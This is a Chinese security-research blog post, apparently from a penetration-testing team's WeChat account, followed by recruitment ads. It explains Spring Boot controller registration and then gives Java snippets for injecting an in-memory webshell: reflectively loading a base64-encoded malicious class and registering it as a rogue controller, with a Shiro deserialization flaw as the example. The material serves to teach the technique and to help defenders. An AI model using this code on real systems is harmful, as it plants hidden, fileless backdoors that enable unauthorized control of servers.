\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/sopTMSFfSAv87KSGsdLrTA)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**No.1  
**_

_**前言**_

Springboot是一个开源框架，其内嵌了一个web容器，当使用springboot开发一个web系统后，他可以打包成一个jar包，直接运行后开启一个web服务，配合nginx进行分布式集群，不用依赖外部给予的web中间件，就算系统中存在文件上传漏洞，他也没办法解析。

在一次项目中，遇到了一个springboot的反序列化漏洞，当时只能执行命令，目标不出网，文件基本没法上传，无奈这个点只能放弃，后续阅读文章时，发现可以用反序列化漏洞打入一个内存shell。

_**_**No.2**_**_

_**springboot 必要知识**_

了解Spring boot的内存shell，需要先了解启动过程中，spring boot是怎么确定url和Controller类的映射关系。

_**_**No.3**_**_

_**简单分析**_

spring boot启动过程中，在AbstractHandlerMethodMapping的initHandlerMethods方法中，获取全部的bean再遍历，遍历的目的是寻找Controller类，只要是注解有@RestController的bean都会进入最后的detectHandlerMethods()方法

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDry6iapxDOxlCIIOfqZ4yBVAVPCdDa0ofib29ZyhSS3u6tg4wF1G1m1Edg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

进入detectHandlerMethods()方法，在这个方法里，首先会查找类中被路由注解修饰过的方法 ，之后获取注解和url的映射关系生成RequestMappingInfo对象，之后将bean，Method，RequestMappingInfo注册进MappingRegistry

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrBwlj3qh5bVJctsNXKOibFEiaibwkFyEoicjfSdZ2YLmF3QyRH1mX1f2YJQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在getMappingForMethod()方法中，会解析Controller类的方法中的注解，从而生成一个与之对应的RequestMappingInfo对象，里面保存了访问Method的url条件

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrX7dGMJ0pAsW528mZl9ibEdk3Id2SWicqaicH7TQibEKr9W1OQfIib2TY3VQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

最后的registerHandlerMethod()方法就是执行mappingRegistry.register()方法，到这里，url与处理的类之间的映射关系被保存，当我们访问url时，springboot便知道由哪个类中的那个方法处理，如果我们能创建一个RequestMappingInfo，一个处理的类，将他们的映射关系保存进mappingRegistry，内存shell就能建立

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrfiaoWBjBWZNVEWYnzAopzMaRcYSMTYU74d92fQoqeXOx9aiaa8RreXCQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在AbstractHandlerMethodMapping类中还有一个方法也会进入mappingRegistry.register()，就是regusterMapping方法，这个方法就是动态添加Controller的接口，在程序过程中，只要调用这个接口，就能注册一个Controller类，从上面的分析过程可以知道，这个接口的使用条件是1，bean实例，2，处理请求的method，3、对应的RequestMappinginfo对象

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDria12jF5G6d2jnQWQOR5GhFicyTVJt5G6e6PGPykxoibk5KR5lYbdw3Lcg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

_**_**No.4  
**_**_

_**实现过程**_

**恶意class加载进JVM**

```
`BufferedReader r = new BufferedReader(new FileReader("shell.txt"));``String code = r.readLine();``byte[] d = new sun.misc.BASE64Decoder().decodeBuffer(code);``java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{String.class, byte[].class, int.class, int.class});``m.setAccessible(true);``m.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{"org.inlighting.util.shell",d, 0, d.length});`
```

**获取上下文环境**

只有在同一个上下文环境才能有效

```
`ServletContext sss = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();``WebApplicationContext context  = WebApplicationContextUtils.getWebApplicationContext(sss);`
```

**创建RequestMappingInfo对象**

定义controller的url和访问方法，生成RequestMappingInfo对象

```
`PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");``RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();``RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);`
```

**RequestMappingHandlerMapping注册controller**

使用registerMapping()方法注册

```
`RequestMappingHandlerMapping rs = context.getBean(RequestMappingHandlerMapping.class);``Method m = (Class.forName("org.inlighting.util.shell").getDeclaredMethods())[0];``rs.registerMapping(info, Class.forName("org.inlighting.util.shell").newInstance(), m);`
```

_**_**No.5  
**_**_

_**实际例子**_

以下使用shiro反序列化漏洞演示：  

准备恶意类

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrPAjoEOktXRFeHVMGBcsKibBribEzUeGPddx4cXZJjxyvaKvH3iaoaB5EA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

先将恶意类写到目标服务器上

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrg9cQk6518pJY0yDvZD2NxWNOpe7t2Y7OXXd3NLy5VswRuoUT0o0j8Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

将恶意类注册进jvm

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDryzWEhwLf60277hdoyYcmORHhmONqicLic1Oq2WL2LFPz41R989vde5yg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrZ3xqLZcS7nuuibek0pwwzoiaWg3D5GGj0v7mOf5T5LjgPlnegAE9rxYw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

注册controller

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrAkAU9qLJB5waqa9lHiaVXtx6LwFEdgXqeZ1uIGOI9Q2icogQahhByWmQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrd3sSzHicfPWic0FFFSicl84FKIeC3UHslJRtOb7DmibRHBxWBlicrF13hrQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWFkQolxT46FDfic5DOInQDrs4A7cW4loHJyuENN3fM1EXs6lrSTxVUWhoaLf4L6ObX4XctyiarFMtA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

_**招聘启事**_

安恒雷神众测SRC运营（实习生）  
————————  
【职责描述】  
1\.  负责SRC的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2\.  负责白帽子提交漏洞的漏洞审核、Rank评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3\.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4\.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5\.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

  

简历投递至 strategy@dbappsecurity.com.cn

  

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
  
【职位要求】  
1、从事平面设计相关工作1年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通photoshop/illustrator/coreldrew/等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦19楼  
学历要求：本科及以上  
工作年限：1年及以上，条件优秀者可放宽

  

简历投递至 strategy@dbappsecurity.com.cn

安全招聘  
————————  
  
公司：安恒信息  
岗位：Web安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1年+  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
  
【岗位职责】  
1.定期面向部门、全公司技术分享;  
2.前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3.负责完成部门渗透测试、红蓝对抗业务;  
4.负责自动化平台建设  
5.负责针对常见WAF产品规则进行测试并落地bypass方案  
  
【岗位要求】  
1.至少1年安全领域工作经验；  
2.熟悉HTTP协议相关技术  
3.拥有大型产品、CMS、厂商漏洞挖掘案例；  
4.熟练掌握php、java、asp.net代码审计基础（一种或多种）  
5.精通Web Fuzz模糊测试漏洞挖掘技术  
6.精通OWASP TOP 10安全漏洞原理并熟悉漏洞利用方法  
7.有过独立分析漏洞的经验，熟悉各种Web调试技巧  
8.熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
  
【加分项】  
1.具备良好的英语文档阅读能力；  
2.曾参加过技术沙龙担任嘉宾进行技术分享；  
3.具有CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP等安全相关资质者；  
4.具有大型SRC漏洞提交经验、获得年度表彰、大型CTF夺得名次者；  
5.开发过安全相关的开源项目；  
6.具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7.个人技术博客；  
8.在优质社区投稿过文章；

  

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2年+  
工作地点：杭州（总部）  
  
【岗位职责】  
1.负责红蓝对抗中的武器化落地与研究；  
2.平台化建设；  
3.安全研究落地。  
  
【岗位要求】  
1.熟练使用Python、java、c/c++等至少一门语言作为主要开发语言；  
2.熟练使用Django、flask 等常用web开发框架、以及熟练使用mysql、mongoDB、redis等数据存储方案；  
3:熟悉域安全以及内网横向渗透、常见web等漏洞原理；  
4.对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5.具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
  
【加分项】  
1.有高并发tcp服务、分布式等相关经验者优先；  
2.在github上有开源安全产品优先；  
3:有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4.在freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5.具备良好的英语文档阅读能力。

  

简历投递至 strategy@dbappsecurity.com.cn

  

岗位：红队武器化Golang开发工程师  
薪资：13-30K  
工作年限：2年+  
工作地点：杭州（总部）  
  
【岗位职责】  
1.负责红蓝对抗中的武器化落地与研究；  
2.平台化建设；  
3.安全研究落地。  
  
【岗位要求】  
1.掌握C/C++/Java/Go/Python/JavaScript等至少一门语言作为主要开发语言；  
2.熟练使用Gin、Beego、Echo等常用web开发框架、熟悉MySQL、Redis、MongoDB等主流数据库结构的设计,有独立部署调优经验；  
3.了解docker，能进行简单的项目部署；  
3.熟悉常见web漏洞原理，并能写出对应的利用工具；  
4.熟悉TCP/IP协议的基本运作原理；  
5.对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
  
【加分项】  
1.有高并发tcp服务、分布式、消息队列等相关经验者优先；  
2.在github上有开源安全产品优先；  
3:有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4.在freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5.具备良好的英语文档阅读能力。  
  
  
简历投递至 strategy@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWoicecuwruj0PTmhH8yWPJSh8FeBt1cvUDSoz5T2MyLVrfhHJnvibOJTyUMD5RnVicPRc3keaVK3BhA/640?wx_fmt=jpeg?x-oss-process=style/xmorient&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWoicecuwruj0PTmhH8yWPJSGMq5W6k4KUGQkOPnRdS9aNFViaBibChIZB7ZIchWNAT4Gktibo59icH5PQ/640?wx_fmt=jpeg?x-oss-process=style/xmorient&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)